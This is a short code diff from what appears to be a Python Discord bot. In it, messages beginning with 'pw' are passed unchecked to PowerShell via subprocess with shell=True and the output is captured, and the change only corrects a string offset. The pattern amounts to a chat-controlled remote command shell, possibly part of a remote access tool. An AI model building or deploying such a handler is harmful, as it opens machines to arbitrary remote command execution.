@@ -255,7 +255,7 @@ async def on_message(message):
         
         
     elif message.content.startswith("pw"):
-        command = message.content[4:]
+        command = message.content[3:]
         output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
         error_output = output[1].decode("utf-8")
         normal_output = output[0].decode("utf-8")
